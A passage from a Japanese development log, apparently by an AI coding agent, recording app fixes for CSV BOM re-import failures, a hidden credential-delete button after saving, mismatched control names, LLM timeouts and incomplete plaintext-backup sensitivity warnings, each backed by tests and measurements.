| **画面が Blob へ入れる物そのもの** | **0 件・「日付は YYYY-MM-DD 形式で入力してください」** | **0 件・「期間は YYYY-MM 形式で入力してください」** |

★ **断りの文が、それを読む利用者に対して証明可能に偽である** —— 日付は `2026-08-01` で、**まさにその形式**である。しかも BOM は**画面に 1 文字も見えない**ので、利用者は正しい欄を何度直しても同じ断りを受ける (逃げ口が無い)。パス 422 の「60 文字まで」と言って 31 文字で断る形と同じ家系だが、**こちらは自分の書き出しに対して起きる**。★ **外から来る CSV でも起きる** —— Excel の「CSV UTF-8」は**常に**この印を付ける。つまり入口は「このアプリの書き出し」と「利用者の表計算ソフトの書き出し」の**両方**で塞がっていた。★ **規則は同じファイルが既に書いていた** —— `parseCsv` の `pushField` の注記が「**書き出し側で付けた数式打ち消しを外す。付けっぱなしだと export → import で値が変わってしまう**」と述べている。つまり**印を 2 つ付けて、剥がすのは 1 つだけ**だった (法則 `center-then-count-callers`)。★ **直しは漏斗 1 か所** —— `CSV_BOM` を `renderer/data/csv.ts` に置き、`parseCsv` が**先頭の 1 つだけ**を外す(途中の U+FEFF は利用者のデータの一部でありうる)。書き出す 3 画面は生の不可視文字をやめてその定数を読む。**印が無い CSV の答えは 1 つも変わらない** (実測: 素の CSV は前と完全に一致)。★ **定数は escape で書く** —— 生の U+FEFF をソースに置くと目に見えず、`lint:charset` が (正しく) 理由つきの台帳を要求する。名前と escape ならどちらも要らない —— **その台帳の 3 行が消えた**。★ **ゲートが設計どおり働いた** —— 3 画面から生の文字が消えた瞬間に `lint:charset` の**両方向の台帳**が「台帳に載っているのに検出されない項目が 3 件」と鳴った。★ **機械は 2 層** —— `renderer/data/__tests__/csvBomRoundTrip.test.ts` (**9 件**) の背骨は**振る舞い**で、**画面が実際に Blob へ入れるのと同じ文字列**を取り込みへ渡して行が戻ることを見る (Excel 形の CRLF + BOM も別に置いた)。母集団は**走査で導き** (`text/csv` を組む 3 画面)、**付ける印と外す印が同じ 1 つ**であることを両方向で留める。対照 **5 方向すべて鳴り、それぞれ狙った検査に当たる** (A 剥がすのをやめる ❌7 (**失敗の出力に「日付は YYYY-MM-DD 形式で…」「期間は YYYY-MM 形式で…」がそのまま出る = 欠陥の再現**) / B 無条件に 1 文字落とす ❌2 (**印が無い CSV を壊す**) / C 全部の U+FEFF を落とす ❌2 (**途中の印は利用者のデータ**) / D SalesPage を生の文字へ戻す ❌1 / E KpiPage を生の文字へ戻す ❌1・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **バックアップ (JSON) の BOM** —— `JSON.parse('\uFEFF{...}')` は `Unexpected token …, "…" is not valid JSON` で落ちるが、**その文は真**である(CSV 側だけが偽を述べていた)。しかもアプリは JSON に印を付けないので、起きるのは利用者が手で足したときだけ。**直しを広げない理由を測って書いた** ② **ハードリセットの範囲** —— `eraseScopeSummary` は「消えない物」(保存先フォルダの控え・ダウンロードしたバックアップ・ブラウザの履歴・ブラウザが覚えたパスワード) まで述べており、`BACKUP_EXCLUSIONS` も定数化されて画面が描く。**この軸は既に閉じていた** ③ **人材育成の重複 id** —— 同じ id の 2 人は落ちず ladder も 3 人とも数える。`id` は結合鍵ではないので欠陥ではない ④ **index を鍵にする一覧** —— `key={i}` は 58 件で入力欄を含むのは 5 件だが、**5 件とも完全に制御された入力**(`value` + `onChange` が親の state を更新する) なので、行を消しても値は入れ替わらない。`typecheck` 緑・`npm test` **848 / 18,475**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15437 → **15446** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 282 ms / heap 10.3 MB・FULL DCL 762 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **26 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 427 後の計測: 11,948,001 B / 3,360,520 B (両方 +71 B** —— 資格情報の札が「保存した / 消した」を覚える状態 1 つと、親が言い直したら捨てる効果 1 つの分。`renderer/components/StatusBar.tsx` は両ビルドが読むので LITE も同じだけ増える (`web-shim.ts` の docblock の訂正は最小化で落ちる)。**資格情報を保存した直後、その画面から消せなくなっていた。** **見つけ方**: パス 425 / 426 の形 (「アプリが述べる事と、実装がする事のずれ」) を**削除の完全性**へ当てた —— 「利用者が資格情報を消したとき、本当にどこからも消えるか」。保管層は両ビルドとも正しく、`main/secrets.ts` も `security/vault.ts` も控えを持たずその場で書き抜ける (実測)。**ずれていたのは画面の側**だった。実測 (2026-09-23 · jsdom で実物の `GithubPage` を描き、橋の `listConfigured` / `setToken` / `clearToken` を 1 つの配列で繋ぐ):

| 操作 | 保管層 | この行の札 | パネルの中 | バッジ |
| --- | --- | --- | --- | --- |
| 保存 (未登録 → 登録) | `['github']` ✅ | **「PAT を設定」のまま** (= 未登録の札) | **「削除」が出ない** | 「ライブ」 |
| 削除 (登録 → 未登録) | `[]` ✅ | **「トークン更新」のまま** (= 登録済みの札) | —— | 「ライブ」 |

★ **重いのは保存の側で、逃げ口がその場で閉じる** —— 「削除」は登録済みのときだけ描くので、**打ち込んだ直後に「やっぱり消したい」と思った人はこの画面から消せない**。設定画面の掃除の節は `unusedStoredCredentials`、つまり**読み手のいない**サービスだけを並べる(その docblock 自身が「入力欄が消えたことで消し方も画面から消えるため、掃除の導線は別に要る」と書いている) ので、github のような**使われている**資格情報はそこにも 1 度も出ない —— 実測で `unusedStoredCredentials(['github'])` は `[]`。**この画面の「削除」が唯一の逃げ口**で、それが資格情報を預けた瞬間に閉じていた (法則 `escape-hatch-stays-open`)。★ **同じ行が同じ問いに 2 通り答えていた** —— 保存した直後、札は「PAT を設定」(まだ何も預かっていない) と言い、隣のバッジは「ライブ」(今その資格情報で取ってきた) と言う (パス 392 と同じ形)。★ **原因は依存の欄** —— この判定を出すのは `useServiceData` の `useEffect` で、依存は `[serviceId, refresh, options.autoFetch]`。**保存しても削除してもどれも変わらない**ので効果は再実行されず、`setIsConfigured` は呼ばれない。しかも**保存の側には既に `onRefresh?.()` が在り**、削除の側には無かった —— その非対称を見て「保存は直っている」と読むと外す (`refresh()` は`setIsConfigured(true)` を**一度も呼ばない**。呼ぶのは `not_configured` のときの `false` だけ)。★ **直しは 1 ファイル** —— 76 画面のうち **50 枚**が `isConfigured` を StatusBar へ渡しているので、渡す側を増やすと 50 枚の編集になる。`StatusBar` が**自分で覚える** (`changedHere ?? isConfigured`) ことにして、書き込みの戻り値が `{ ok: true }` なら保管層は書き終えている (両ビルドとも控えを持たない) という事実を使う —— **追加の IPC は要らない**。**親が言い直したら覚えは捨てる** (`useEffect(…, [serviceId, isConfigured])`) ので、取得が `not_configured` を返したときの**より新しい**報せが勝ち、覚えがサービスを跨がない。★ **機械は振る舞いだけ** —— `renderer/components/__tests__/credentialAffordanceAfterWrite.test.ts` (**6 件**) が実物の画面を描いて実際に押し、**札と「削除」ボタンと保管層を同じ流れの中で**突き合わせる。綴りの走査は置かない —— 見るべきは「利用者が何を読み、何を押せるか」で、それは描いて押せば直接出る。待ちは**条件で**取る (法則 `wait-for-condition-not-ticks`・`jsdomWait` の `waitForElement` / `settleUntil`) ので `audit:tick-sensitivity` の母集団には入らない (台帳はパス 385 から 0 本のまま)。「この画面の削除が唯一の逃げ口」も**実物の関数で**確かめる (写しで言うと古びる) —— 針が的に当たる標本つき (読み手のいないサービスなら掃除の節に出る)。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 札の判定を `isConfigured` へ戻す ❌4 (**欠陥がそのまま再現**) / B 「削除」を戻す ❌1 (**逃げ口が閉じる**) / C ブラウザ認証のボタンを戻す ❌1 / D 覚えの reset を消す ❌1 (**サービスを跨いで漏れる**) / E 削除の言い直しを消す ❌1 / F 保存の言い直しを消す ❌4・復帰後 ❌0)。★ **ついでに同じファイルの散文を 3 つ訂正した** —— `web-shim.ts` の冒頭の docblock は ① `setToken / clearToken / listConfigured → no-op` (**偽** —— 3 つとも保管庫への実物の読み書きで、資格情報が生きている経路である。**この行を読んで「ブラウザ版はどこにも預からない」と判断する**のがいちばん危ない読み方) ② `fetchSnapshot() → returns "not_implemented"` (**偽** —— stocks / hydroponics / ollama / emotions ほかを実装しており、落ちるのは実装の無い物だけ) ③ `export-svg → 画面の <svg> を掻き取る` (**パス 268 で消した実装の説明**) と書いていた。③ は**同じファイルの 1,080 行下の docblock が「ここに在ったのは `tryGrabSvgFromPage()`」と消した理由まで書いている** —— 1 つのファイルの中で、冒頭だけが古いままだった。**機械は足さない** —— 「その文が無いこと」の検査は言い換えられた瞬間に黙るので、下の事実 (vault の往復・`renderTeamRadarSvg` を通ること) を留める検査が既に在ることを確かめて訂正だけにした (法則 `measure-before-claim` の「訂正は写しの数だけ要る」)。★ **測って何も無かった軸も記録する**: ① **保管層に控えは無い** —— `main/secrets.ts` は読み書きのたびにファイルへ通し (`readStore` / `writeStore`)、モジュール直下の状態は`lastReadDegraded` (最後の読みが劣化したかの札) だけ。`security/vault.ts` も毎回 `openDb()` → `idbDelete` → `close()` で、資格情報の写しをメモリに持たない ② 設定画面の `forget` は削除後に `reload()` を呼んでおり**最初から正しい** (行が消えるのが合図) —— 欠陥は StatusBar の側だけだった ③ **削除しても画面の第三者データは残る** (`data` / `source` は触らない)。これは欠陥ではない —— 出ているのは**実際に取ってきた**中身で、消すと「取れなかった」という別の主張になる。`typecheck` 緑・`npm test` **847 / 18,466**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15431 → **15437** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 270 ms / heap 10.3 MB・FULL DCL 732 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **25 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 426 後の計測: 11,947,930 B / 3,360,449 B (両方 +12 B** —— 名指しの綴りを「記録」から「レコード」へ直した分。**出荷される出現は 2 つ**で、(4 字 − 2 字) × 3 byte × 2 = 12 B と**計算どおり一致する** (3 つ目は docblock なので最小化で落ちる)。**名指しした操作子の綴りが、画面に 1 度も出ていなかった。** **見つけ方**: パス 425 の形 (「指さした先に、それが在るか」) を**画面の名前から画面の中の操作子の名前へ**下ろした。利用者へ出す文が `「X」ボタン / タブ / 欄 / を押 / から消せ` の形で名指しする物を走査すると **14 件**で、実物を当たると **13 件は在り、1 件だけ無かった**。実測 (2026-09-23 · jsdom で実物の設定画面を描いて全文 15,725 字を探す):

| 名指し | 設定画面に在るか |
| --- | --- |
| 数値パラメータ / バックアップ / バックアップ / 復元 / 権限を再取得 / Vault 管理 | **在る** ✅ |
| **形式の合わない記録** (`sales.ts` ×2) | **無い** ❌ —— 実物は「形式の合わない**レコード**の点検」 |

★ **パス 425 より軽い、と正直に言う** —— 逃げ口そのものは在り (パス 425 が確かめた)、パネルは「形式の合わない」まで一致するので目では見つかる。欠けていたのは**探せるか**の側で、利用者が設定画面でその語を探しても 1 度も当たらない。**指さす先は利用者が探せる綴りでなければ、指さしたことにならない。** ★ **直す向きを測って決めた** —— パネルは 6 か所で「レコード」と綴り、確認のダイアログもそうである。**名乗られる側ではなく名乗る側を直す**のが最小で、しかも利用者が読むのは名乗る文のほうである。★ **直した瞬間に、自分の針が母集団を空にしかけた** —— パス 425 の `namedEscapeHatchReachable` の`AUDIT_PANEL` は**旧い綴り**を針にしていたので、文を直すとその走査は 0 件になる。**両方向の台帳がその場で鳴った** (「台帳に在るのに走査に無い」) ので気付けた —— **綴りで数える針は、綴りを直した日に必ず点検が要る。** ★ **機械は実物を描く** —— `renderer/pages/__tests__/namedControlExists.test.ts` (**8 件**) が母集団を**走査で導き** (14 件) 台帳と**両方向**に突き合わせ、種類ごとに確かめる: `settings-control` は**実物の設定画面を描いて**綴りを探す・`same-screen-control` (9 件) は描いているファイルに綴りが在る (**`「…」` の言及は落としてから**探す —— 言及と宣言を見分ける)・`screen-label` (2 件) はパス 425 の検査が `SERVICES` と突き合わせる (`swept-elsewhere`)・`third-party` (Azure ポータルのタブ) と`runtime-label` (`{this.props.label}`) は理由つきの免除。対照 **6 方向すべて鳴り、それぞれ狙った検査に当たる** (A 文を「記録」へ戻す ❌2 (**欠陥がそのまま再現**) / B パネルの見出しを別の綴りへ ❌1 (**逆向きも鳴る**) / C 台帳から 1 行消す ❌2 / D 母集団に無い名前を台帳へ ❌1 / E 針を殺す ❌3 (**床が鳴る**) / F 描画元を「言及だけ」のファイルへ ❌1 (**`「…」` を落とす所の対照**)・復帰後 ❌0)。★ **測って何も無かった軸も記録する**: ① **同じ走査で見つけた他の 13 件は全部実在した** —— `Canva で編集する` / `ファイルを開く` / `今すぐ作る` / `SVG を保存` / `チーム情報を保存` / `もう一度確認` / `接続テスト` / `暗号化パスワード` / `更新` の 9 件は描くファイルに綴りが在り、`KPI / BEP` と `売上集計` は `SERVICES` のラベル ② **`今すぐ作る` は別の画面 (ホーム) のボタンだが、文が「「ホーム」ページの」と画面名も一緒に述べている**ので迷わない ③ **金融機関等提出用の書面の単位** —— 「千円」を名乗る所で円の値を刷る形を探したが、`yenAmt` (1 件あたりの額に `円` を付ける) は**平均受注単価と出荷 1 株当たり原価の 2 件だけ**で、どちらも 1 件あたりの額である。残りは全部 `amt` (表頭が名乗る単位) を通り、`千円未満切捨て` は表頭が宣言している**日本の決算書の標準の作法**なので、`0` は嘘ではない。`typecheck` 緑・`npm test` **846 / 18,460**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15423 → **15431** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 260 ms / heap 10.3 MB・FULL DCL 726 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **24 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 425 後の計測: 11,947,918 B / 3,360,437 B (両方 +387 B** —— 逃げ口を名指しし直した文 2 つ (経営サマリー向けは新設) の分。**増分はほぼ日本語の文**で、docblock は最小化で落ちる。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**アプリが「ここで消せます」と名指しした画面は、その行を見つけられなかった。** **見つけ方**: パス 422〜424 の形 (「アプリが述べる事と、実装がする事のずれ」) を**行き先の主張**へ当てた —— 画面が「どこで消せるか」を指さす文を全部読み、**指さした先にその行が在るか**を実物で測った。実測 (2026-09-23):

| collection | 標本 | 形の表 | 名指しされた逃げ口 | そこに在るか |
| --- | --- | --- | --- | --- |
| `sales-entries` | `date: '2026-02-31'` | `calendarDate` —— 断る | 設定の点検パネル | **在る** ✅ |
| `kpi-actuals` | `period: 'bad'` | **`str`** —— 通す | 設定の点検パネル | **無い** ❌ |

★ **行った先が、警告と正反対のことを言う** —— jsdom で通しで測ると (良い行 1 + 期が読めない行 1)、KPI の画面は「…（**設定の「形式の合わない記録」から消せます**）。」と述べ、名指しされたパネルは 「調べた 2 件に**形式の合わないレコードはありません**。」と答えた。**2 つの画面が、問題が在るかどうかについて互いに矛盾していた。** ★ **そして本物の逃げ口は、その人が今見ている画面に在った** —— KPI の一覧は `records.map` で**選別せずに**描くので、その行は `bad A ￥1,000,000 ￥1,000,000 ×` として一覧に出ており、× を 1 度押せば消える。**案内は 1 画面ぶん遠回りをさせたうえ、着いた先で否定していた。** ★ **原因は写し** —— この文はパス 225 から在り、隣の `sales.ts` の `unreadableSalesDateNote` が**同じ文面を持ち、売上では正しい** (`date: calendarDate` なので形の表が断る)。点検パネルが見るのは**形**であって暦ではないので、`period: str` の KPI では同じ文が偽になる —— パス 398 / 408 と同じ非対称 (隣が正しく、こちらだけがその前提を持たないまま写された)。★ **2 つ目: 指さす画面の名前が実在しなかった** —— 経営サマリーの 2 文 (パス 390 の `duplicateActualsOverviewNote` と今回の新設分) は「「**KPI 実績**」の画面」と書いていたが、**サイドバーの 76 のラベルにその綴りは無い** (実物は `KPI / BEP`)。探せない綴りで指さしても指さしたことにならない。「売上集計」を名乗る 3 文は正しかった (実在するラベル)。★ **形の表は緩めないと決めた (理由を実物に書いた)** —— `period` を暦の月に厳しくすると復元の入口 (`store.importAll`) がその行を**捨てる**。期の綴りが崩れているだけで売上の数字は本物なので、落とすのは別の事故である (`collectionShapes.ts` が自分で「落とし過ぎは復元の欠落 = 別の事故になる」と書いている)。**直すのは文のほうである。** **直し**: ① KPI の文は「その行も下の一覧に出ています —— 一覧の × で消せます」 ② 経営サマリーには一覧が無いので**3 つ目の関数** `unreadablePeriodOverviewNote` を置く (`duplicateActualsOverviewNote` (パス 390) とまったく同じ理由。`OverviewPage` の注記は「3 つ目の関数は作らない」と書いていたが、**足りるのは件数の種別だけで逃げ口は足りなかった**) ③ 画面名を `SERVICES` の実物のラベルへ。**正常な状態の答えは 1 つも変わらない** (断りが出ない利用者には差が無い)。★ **機械は 2 層** —— `renderer/data/__tests__/namedEscapeHatchReachable.test.ts` (**11 件**) が母集団を**走査で導き** (逃げ口を名指しする綴りを持つ export された関数・実測 **12 関数**) 台帳と**両方向**に突き合わせ、種類ごとに**振る舞いで**確かめる: `audit-panel` は実物の `auditRecordShapes` がその標本を見つけること・`list-x` は標本が形の表を**通る**こと (通らなければ復元で捨てられ一覧に出ない)・`other-screen` は「「X」の画面」の X が `SERVICES` のラベルであること。背骨は `renderer/pages/__tests__/unreadablePeriodHatchOnScreen.test.ts` (**3 件**) で、実物の保管層へ入れて実物の画面を描き、**警告・一覧の ×・点検パネルの答えを同じ保管層で突き合わせる**。対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる** (A 文を元へ戻す ❌6 (**欠陥がそのまま再現し、jsdom の「点検パネルを名指ししない」が鳴る**) / B 経営サマリーの画面名を戻す ❌2 / C パス 390 の画面名を戻す ❌1 / D KPI の一覧を選別する ❌2 (**逃げ口をその画面から消すと鳴る**) / E 売上の形を `str` へ緩める ❌2 (**名指ししたパネルが対象を見失う —— 不変条件そのもの**) / F 台帳から 1 行消す ❌1 / G 針を殺す ❌4 (**床が鳴る**)・復帰後 ❌0)。★ **census が私の編集をその場で 1 つ捕まえた** —— 私は `duplicateActualsOverviewNote` に「一覧の ×」を足していたが、それは**この欠陥とは無関係の拡張**だった。両方向の台帳が「走査に無い種類が台帳に在る」と鳴らし、**最小の変更へ戻した** (画面名の訂正だけを残した)。★ **ゲートが 1 つ捕まえた**: `absenceSampleCensus` —— 私の新しい検査の `not.toMatch(/^同上[。）)]?$/)` に標本が無かった。**CLAUDE.md の規約そのもの**で、針が禁じたい文面に当たることを同じ `it` で示す形に直した。★ **自戒: 前の手で publish しかけた結論が偽だった** —— `paperAccount.ts` の対照で `if (price != null) equity += pos.shares * price` を `equity += pos.shares * (price ?? 0)` に替えても 47 件とも通ったので「この判定は誰も留めていない」と読んだ。**偽である** —— `shares * 0` は 0 を足すので、**飛ばすことと 0 円として数えることは返り値として完全に等価**である。門を丸ごと外す対照 (`price!`) を当てると **❌2** で、判定はちゃんと留まっていた。パス 399 が立てた 3 区分 (**偽の生存 / 等価 / 本物の穴**) の「等価」で、**「落ちなかった」を「穴」と読まない**。`typecheck` 緑・`npm test` **845 / 18,452**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15406 → **15423** へ —— **今回も予想せず門に訊いた**)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 248 ms / heap 10.3 MB・FULL DCL 705 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **23 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 424 後の計測: 11,947,531 B / 3,360,050 B (両方 +26 B** —— 端末内の生成の締切を共有の 1 つにし、画面がそれを定数から刷る分。main の 3 クライアント (ollama / skills / emotions) の直しは出荷物に入らない。**LLM の補完 3 か所が、通常の HTTP の予算 (30 秒) で切れていた。** **見つけ方**: パス 422 の形 (「アプリが述べる事と、実装がする事のずれ」) を**時間の主張**へ当てた。走査は 108 件出たが**大半は学術・法令コーパスの日本語の分数**(「3分の1」「2割5分」) で、画面の時間の主張で定数から出ていないのは **1 つだけ**だった —— `OllamaPage` の「🔒 デスクトップ版はリクエスト 30 秒」。**その 1 行が入口だった。** 実測 (2026-09-23 · 偽の fetch を吊るして締切だけを進める):

| 口 | 送る物 | 直す前 | 直した後 |
| --- | --- | ---: | ---: |
| **`ollama/chat` (デスクトップ)** | 端末内のモデルへ生成 | **30 秒** (@29s 生・@31s abort) | 120 秒 |
| **`skills/run-skill`** | Anthropic `max_tokens: 2048` + スキル本文を system へ | **30 秒** (@31s「skills が時間内に応答しませんでした」) | 120 秒 |
| **`emotions/analyze-text`** | Anthropic `max_tokens: 512` | **30 秒** | 120 秒 |
| `assistant/chat` ほか 4 件 | —— | 120 秒 | 120 秒 |

★ **アプリは規則を 3 度書いていて、3 か所だけが従っていなかった** —— `shared/ai/chat.ts` は「2 分は『正当な補完は余裕で終わり、固まった相手は必ず切れる』側に倒した値」、`shared/httpLimits.ts` は「**LLM の補完だけは長くかかりうるので、そちらは別に持っている**」、`renderer/network/ollamaWeb.ts` は「**生成は診断より時間がかかる。5 秒で切ると実用にならないので別枠にする**」。**後者の理由はデスクトップ版にも等しく当てはまる** (同じ端末の同じモデルへ、同じ `/api/chat` を投げる) —— デスクトップ版だけが別枠を持たなかったのは判断の差ではなく**既定引数のまま**だったからである。★ **入口が、締切の応えられない大きさを許していた** —— `MAX_OLLAMA_PROMPT_CHARS` は **32,768 字**で、端末内の推論は CPU / GPU 律速なので 30 秒で終わる保証はどこにも無い (パス 359 の「入口が出口より厳しい」の裏返し)。★ **なぜどの機械も捕まえなかったか (測った)**: ① `deadlineCensus` (パス 282) は**裸の数を書かないこと**しか要求せず、その docblock 自身が「値が両ビルドで同じかは要求しない…両ビルドが同じ名前を読んでいるかは**読めば分かる**」と書いている —— **読めば分かる、は誰も読まなければ分からない** (main は `REQUEST_TIMEOUT_MS = 30_000`、web は同名の `REQUEST_TIMEOUT_MS = 5_000` で、**同じ名前が 6 倍違う値を指していた**) ② `lint:parameter-prose` は構造的に届かない (CLAUDE.md が「安全上限 (timeout / 応答サイズ / …) は台帳に載せない」と決めている) ③ **`storageClaims` の画面の検査は「どの版の数字か名乗っていれば直書きでよい」と免除しており、その免除が覆っていた唯一の行がこの 30 秒だった** —— 名乗ることと**定数から出すこと**は別である。**直し**: ① 生成の締切は `shared/httpLimits.ts` の `OLLAMA_CHAT_TIMEOUT_MS` **1 つ**で両ビルドが読む (`AI_CHAT_TIMEOUT_MS` には畳まない —— `shared/ai/chat.ts` はこのファイルを import するので循環になるうえ、母集団が違う (クラウドの提供者 / loopback か利用者が設定した Ollama ホスト)。理由を実物に書いた) ② main の私有の `30_000` は `DEFAULT_HTTP_TIMEOUT_MS` を読む (疎通確認の予算はそのまま・**広げていないことを検査が見る**) ③ `skills` / `emotions` は `timeoutMs: AI_CHAT_TIMEOUT_MS` を渡す (兄弟の `stocks` / `business` が最初からそうしている) ④ 画面は 4 つの数を全部定数から刷り、**免除ごと外した** (実測 0 / 10 ブロック)。★ **publish 済みの散文を 3 つ訂正した**: ① `ai/chat.ts` の「**30 秒は Ollama のローカル推論向けで**」は偽 (あの 30 秒は疎通確認の予算で、生成がそれを使っていたのは既定引数のまま) ② `ollamaWeb.ts` の「同じ制約 (… **タイムアウト**) でここに実装する」は**タイムアウトについてだけ偽**だった ③ `docs/OLLAMA_SECURITY.md` の「30 秒タイムアウト」は用途で 2 つに分かれる。機械は `shared/__tests__/llmDeadlineCensus.test.ts` (**4 件**) —— 母集団を**実装から導く** (`aiActionHandlers(ANY_AI_MARKS)` が `ACTIONS` から辿って LLM の口に届く handler だけを返す・パス 106 / 114 と同じ走査) ので、新しい AI の action を足して予算を渡し忘れれば名指しで落ちる。免除の台帳は**両方向・今日 0 件**。背骨は**振る舞い** (`ollamaChatDeadline.test.ts` **5 件** + `skills.test.ts` に 1 件)。対照 **8 方向すべて鳴り、それぞれ狙った検査に当たる** (A main の chat から第 5 引数を外す ❌1 (**欠陥がそのまま再現**) / B web を私有の値へ ❌2 / C 疎通確認にも生成の予算 ❌1 (**広げすぎ**) / D 画面を直書きへ ❌2 (**免除の除去が効いている**) / E 生成の予算を通常の予算と同じに ❌2 / F skills の `timeoutMs` を外す ❌2 (振る舞いと census の両方) / G emotions の `timeoutMs` を外す ❌1 / H 台帳に母集団外の行 ❌1・復帰後 ❌0)。★ **自戒: 私の新しい検査が「固定回数で待つ」形で、単体では通り全件実行で落ちた** —— スキル本文の読み取りは実 I/O なので、負荷の下では 20 周で終わらず `fetch` が呼ばれる前に締切を進めていた (timer がまだ無いので進めても何も起きない)。**法則 `wait-for-condition-not-ticks` (パス 368) そのもの**で、このリポジトリにはその監査の道具まで在る。条件 (`fetch` に届いたこと) で待ち、届かなければ名指しで落とす形に直した。★ **自戒 2: 鎖を先に回さなかった** —— `shared/ai/chat.ts` と `shared/httpLimits.ts` は保護対象で、気付いたのは `npm test` の**外側の証人**だった (`chain:verify` を私が先に回していない・パス 361 / 362 と同じ形で **3 度目**)。block **#256** を採掘した。`typecheck` 緑・`npm test` **843 / 18,435**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15395 → **15406** へ —— **今回も予想せず門に訊いた**。2 度に分けて訊き、2 度とも外れていた)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 212 ms / heap 10.3 MB・FULL DCL 565 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **22 回目**でもあり、今回も再現しなかった))・**2026-09-23 パス 423 後の計測: 11,947,505 B / 3,360,024 B (両方 +514 B** —— 第 3 の分類の台帳 1 行 (理由の日本語つき)・表示名 1 つ・確認文の 1 語の分。**理由は docblock ではなく値**なので最小化で落ちない。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**平文バックアップの確認文が、士業の相談記録を 1 件も数えていなかった。** **見つけ方**: パス 422 の形 (「アプリが利用者に述べる事と、実装がする事のずれ」) を**約束の側**へ当てた —— 画面が「送信しません」と約束する所を全部読み (実コード 5 件)、どれも今日は守られていた (実測: 不動産・投資信託・水耕の collection は読み手が自分の画面 1 つだけで、`AssistantPage` はどの collection も購読しない)。その走査の途中で**平文バックアップの確認文**に着き、個人情報の判定が**欄の名前**からしか導かれていないことに気付いた。実測 (2026-09-23 · 直す前):

| 利用者 | 直す前 | 直した後 |
| --- | --- | --- |
| 士業の相談記録だけ 3 件 | **確認文が `null`** (無言で平文へ書く) | 「…**3 件**入ります: 士業の相談記録 3 件」 |
| 連絡先 1 + 相談 2 | **「個人情報を含む記録が 1 件入ります」** | 「…**3 件**入ります: 連絡先 1 件・相談記録 2 件」 |

★ **2 つ目のほうが鋭い** —— 確認文は**数を名乗る**ので、過少申告は「1 件なら平文でいいか」と利用者を**油断させる向き**に外れる。パス 422 (「60 文字まで」と言って 31 文字で断る) と同じ家系で、**アプリが数を述べ、その数が実物と違う**。しかも向きが逆で、422 は利用者を不当に厳しく扱い、423 は**不当に安心させる**。★ **同じ士業 CRM の中で分類が割れていた** —— 連絡先 (電話・メール) は個人情報と判定されるのに、**「いつ・どの士業に・何を相談したか」**は判定されない。`shigyo-consultations` は `{serviceId, date, topic, status}` で**名前の手がかりを 1 つも持たない**が、入口の placeholder は「例: 決算前の節税相談」で、弁護士・司法書士の画面なら相続・解雇・破産の相談テーマがそのまま入る。**持ち出せば連絡先より機微になりうる。** ★ **判定の docblock は自分の手がかりを正しく述べていた** —— 「欄の名前で走査し、台帳は『入れ物の形だけなので欄の名前から導けない collection』に限る」。**2 つとも欄の名前を手がかりにする**ので、**何を記録しているかだけが機微**な第 3 の家系は構造的に母集団へ入らない。**直し**: ① `SENSITIVE_BY_CONTENT` を第 3 の台帳として置く (理由つき・今日 1 行) ② 表示名を足す (既存の両方向の検査がその場で要求した) ③ 確認文の名乗りを「個人情報を含む記録」→「**個人情報・機微な記録**」へ —— **確認文の目的は「個人情報か」ではなく「持ち出すと困るか」**で、その文自身が「このファイルを持ち出す・共有するなら…暗号化してください」と言っている。★ **正直に言う: 答えが変わる入力が在る** —— 相談記録を持つ利用者は、今まで出なかった確認が出る (または件数が増える)。これは意図した変更で、既存の検査 2 本が留めていた文面も実測へ直した。**自社の数値だけの利用者の答えは 1 つも変わらない** (実測: `sales-entries` / `kpi-actuals` だけなら今までどおり `null`)。★ **機械は「分類の母集団」を両方向で持つ** —— `renderer/data/__tests__/plaintextExposureClassification.test.ts` (**9 件**) が、**形の表のどの collection も 4 つのどれかを名乗る**ことを要求する (`field-name` / `nested` / `content` / **理由つきの `not-sensitive`**)。**理由の無い `not-sensitive` は認めない** —— この欠陥は「機微でないと判断した」のではなく「**誰も問わなかった**」ために起きたので、理由の欄が問わせる。対照 **7 方向すべて鳴り、それぞれ狙った検査に当たる** (A 相談記録を機微から外す ❌6 (**欠陥の 2 症状がそのまま再現し、既存の表示名の検査まで鳴る**) / B 第 3 の台帳を集計に入れない ❌3 / C 表示名を消す ❌3 / D 非機微の台帳から 1 行消す ❌1 / E 理由を省略形へ ❌1 / F 機微と非機微の両方に載せる ❌1 / G 確認文が件数を名乗らない ❌4・復帰後 ❌0)。★ **床が私の「同上」を 3 つ捕まえた** —— 非機微の理由に `'同上 (予算の側)。'` などと書いたら 15 字の床が鳴った (パス 421 とまったく同じ形で、**2 パス後にまた踏んだ**)。省略を書くと次に読む人は「何について同じなのか」を自分で確かめ直すことになるので、3 行とも書き直した。★ **測って何も無かった軸も記録する**: ① **「送信しません」の約束 5 件はすべて今日守られている** —— 不動産・投資信託・水耕の collection は読み手が自分の画面だけで出口を持たず (出口を持つファイルは実測 32 本)、パスワード強度チェッカーの `pwInput` は読み手が **4 